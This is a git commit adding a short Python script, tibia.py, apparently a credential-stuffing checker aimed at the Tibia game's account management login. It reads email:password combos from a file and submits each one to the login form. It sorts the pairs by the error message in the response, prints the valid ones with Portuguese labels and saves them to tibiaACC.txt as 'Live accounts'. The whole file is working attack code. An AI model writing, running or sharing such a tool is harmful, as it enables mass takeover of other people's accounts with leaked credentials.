c6f960d8625abd3d836e9991288f64739aabeef5
rugalo798 <34358578+rugalo798@users.noreply.github.com>
2020-04-09 04:24:43 -0300

    Add files via upload

---
+++ tibia.py
@@ -0,0 +1,28 @@
+import requests
+
+req = requests.session()
+url = 'https://www.tibia.com/account/?subtopic=accountmanagement'
+a = open('combo.txt', 'r')
+stop = 'default'
+file = [s.rstrip() for s in a.readlines()]
+for lines in file:
+    combo = lines.split(':')
+    param = {
+        'loginemail': combo[0],
+        'loginpassword': combo[1],
+        'page': 'overview'
+    }
+    try:
+        source = req.post(url, data=param)
+
+        if('You have entered a wrong password or email address.' in source.text):
+            print('Email ou senha errados: {}:{}'.format(combo[0], combo[1]))
+
+        else:
+            print('Conta Funcionando: {}:{}'.format(combo[0], combo[1]))
+            print('--> Live accounts <--\n' + combo[0] + '|' + combo[1], file=open('tibiaACC.txt', 'a+'))
+
+    except:
+        break
+    if(stop in combo[0]):
+        break
